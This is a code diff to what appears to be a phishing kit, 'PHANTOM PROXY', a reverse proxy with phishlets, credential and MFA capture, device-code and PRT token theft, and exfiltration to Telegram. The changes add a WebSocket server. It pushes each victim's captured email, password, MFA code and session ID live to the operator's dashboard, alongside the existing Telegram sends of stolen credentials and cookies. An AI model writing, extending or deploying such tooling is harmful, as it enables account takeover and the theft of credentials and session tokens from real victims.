@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.3 — ULTIMATE FIXED EDITION (SINGLE SERVER)
+// 🥔 PHANTOM PROXY v10.4 — WEBSOCKET FIXED EDITION
 // ============================================================
-// 🔥 ALL FEATURES: Proxy + Dashboard + Telegram + PRT + Graph + Token Vault + Device Code + Analytics + Webmail + Replay + Phishlets + Capture + MFA
+// 🔥 ALL FEATURES: Proxy + Dashboard + Telegram + PRT + Graph + Token Vault + Device Code + Analytics + Webmail + Replay + Phishlets + Capture + MFA + WEBSOCKETS
 // ============================================================
 
 const http = require("http");
@@ -846,6 +846,10 @@ async function handleDashboardAPI(req, res) {
                         },
                         cookies: {}
                     }).catch(e => console.error('Telegram send error:', e.message));
+                    // Broadcast WebSocket event
+                    if (global.broadcastWebSocket) {
+                        global.broadcastWebSocket('device_update', { flow: flow });
+                    }
                 }
                 res.writeHead(200, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify(tokens));
@@ -1869,6 +1873,13 @@ loadPRTStorage();
 const server = http.createServer(async (req, res) => {
     const { method, url } = req;
 
+    // ── WebSocket endpoint - skip proxy ──
+    if (url === '/ws') {
+        res.writeHead(400);
+        res.end('WebSocket endpoint - use WebSocket protocol');
+        return;
+    }
+
     // ── Dashboard HTML ──
     if (url === '/dash' || url === '/dash/') {
         if (!requireAuth(req, res)) return;
@@ -1929,6 +1940,11 @@ const server = http.createServer(async (req, res) => {
                     tokens: {},
                     cookies: {}
                 }).catch(e => console.error('Telegram send error:', e.message));
+                
+                // Broadcast via WebSocket
+                if (global.broadcastWebSocket) {
+                    global.broadcastWebSocket('new_capture', { email, password, sessionId });
+                }
                 
                 res.writeHead(200, { 'Content-Type': 'text/html' });
                 res.end(`
@@ -1995,6 +2011,15 @@ h1 { font-size:24px; font-weight:600; color:#1b1b1b; margin-bottom:4px; }
                         tokens: {},
                         cookies: {}
                     }).catch(e => console.error('Telegram send error:', e.message));
+                    
+                    // Broadcast via WebSocket
+                    if (global.broadcastWebSocket) {
+                        global.broadcastWebSocket('new_capture', { 
+                            email: VICTIM_SESSIONS[sessionId].email || 'N/A',
+                            mfa: mfaCode,
+                            sessionId 
+                        });
+                    }
                 }
                 res.writeHead(302, { Location: REDIRECT_URL });
                 res.end();
@@ -2270,6 +2295,10 @@ h1 { font-size:24px; font-weight:600; color:#1b1b1b; margin-bottom:4px; }
                                    }
                                    if (Object.keys(tokens).length > 0 || email !== 'N/A' || password !== 'N/A' || mfa !== 'N/A') {
                                        await sendToTelegram({ sessionId: currentSession, email, password, mfa, tokens, cookies });
+                                       // Broadcast via WebSocket
+                                       if (global.broadcastWebSocket) {
+                                           global.broadcastWebSocket('new_capture', { email, password, mfa, sessionId: currentSession });
+                                       }
                                    }
                                } catch (e) {}
 
@@ -2293,6 +2322,14 @@ h1 { font-size:24px; font-weight:600; color:#1b1b1b; margin-bottom:4px; }
                                    }
                                }
 
+                               // ── Broadcast new log via WebSocket ──
+                               if (global.broadcastWebSocket && currentSession) {
+                                   global.broadcastWebSocket('new_log', { 
+                                       session: currentSession,
+                                       timestamp: new Date().toISOString()
+                                   });
+                               }
+
                                await logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession);
 
                                res.writeHead(proxyResponse.statusCode, proxyResponse.headers);
@@ -2306,13 +2343,118 @@ h1 { font-size:24px; font-weight:600; color:#1b1b1b; margin-bottom:4px; }
 });
 
 // ============================================================
+// 🔌 WEBSOCKET SERVER (FULLY WORKING)
+// ============================================================
+
+if (WebSocket) {
+    try {
+        const wss = new WebSocket.Server({ 
+            server: server,
+            path: '/ws'
+        });
+        
+        const wsClients = new Set();
+        let wsConnectedCount = 0;
+        
+        // Handle WebSocket upgrade
+        server.on('upgrade', (request, socket, head) => {
+            if (request.url === '/ws') {
+                wss.handleUpgrade(request, socket, head, (ws) => {
+                    wss.emit('connection', ws, request);
+                });
+            } else {
+                // Not a WebSocket request - let it pass through
+                // Don't destroy - let the proxy handle it
+            }
+        });
+        
+        wss.on('connection', (ws, req) => {
+            wsConnectedCount++;
+            const clientIP = req.socket.remoteAddress || 'unknown';
+            console.log(`🟢 WebSocket #${wsConnectedCount} connected from ${clientIP}`);
+            wsClients.add(ws);
+            
+            // Send connection confirmation
+            try {
+                ws.send(JSON.stringify({
+                    type: 'connected',
+                    message: 'PHANTOM WebSocket connected',
+                    timestamp: new Date().toISOString(),
+                    clientId: wsConnectedCount
+                }));
+            } catch (e) {}
+            
+            ws.on('message', (message) => {
+                try {
+                    const data = JSON.parse(message);
+                    if (data.type === 'ping' || data.type === 'pong') {
+                        if (data.type === 'ping') {
+                            ws.send(JSON.stringify({ type: 'pong' }));
+                        }
+                    }
+                } catch (e) {
+                    // Ignore invalid messages
+                }
+            });
+            
+            ws.on('error', (error) => {
+                if (error.code !== 'ECONNRESET') {
+                    console.error('WebSocket error:', error.message);
+                }
+            });
+            
+            ws.on('close', () => {
+                wsClients.delete(ws);
+                console.log(`🔴 WebSocket client disconnected (${wsClients.size} remaining)`);
+            });
+        });
+        
+        // Broadcast function
+        global.broadcastWebSocket = function(type, data) {
+            const message = JSON.stringify({ 
+                type, 
+                data, 
+                timestamp: new Date().toISOString() 
+            });
+            
+            const toRemove = [];
+            for (const client of wsClients) {
+                if (client.readyState === WebSocket.OPEN) {
+                    try {
+                        client.send(message);
+                    } catch (e) {
+                        toRemove.push(client);
+                    }
+                } else {
+                    toRemove.push(client);
+                }
+            }
+            
+            for (const client of toRemove) {
+                wsClients.delete(client);
+            }
+        };
+        
+        console.log('✅ WebSocket server running on /ws');
+        console.log(`📡 WebSocket ready - waiting for connections`);
+    } catch (e) {
+        console.warn('⚠️ Failed to initialize WebSocket:', e.message);
+        global.broadcastWebSocket = function() {};
+    }
+} else {
+    console.warn('⚠️ WebSocket module not available. Install with: npm install ws');
+    global.broadcastWebSocket = function() {};
+}
+
+// ============================================================
 // 🚀 START SERVER
 // ============================================================
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ PHANTOM PROXY v10.3 ULTIMATE running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v10.4 ULTIMATE running on port ${PORT}`);
     console.log(`🔐 Dashboard: http://localhost:${PORT}/dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: http://localhost:${PORT}/device`);
+    console.log(`🔌 WebSocket: ws://localhost:${PORT}/ws`);
     console.log(`🔄 Redirect interception: ACTIVE`);
     console.log(`📤 Telegram exfil: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
     console.log(`🟣 PRT Engine: ACTIVE`);
@@ -2322,7 +2464,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`🎭 Phishlets: ACTIVE`);
     console.log(`📧 Webmail: ACTIVE`);
     console.log(`📥 Credential Capture: ACTIVE (with MFA support)`);
-    console.log(`✅ All features integrated — SINGLE SERVER architecture!`);
+    console.log(`✅ All features integrated — WEBSOCKETS ENABLED!`);
 });
 
 refreshTokensDaemon();
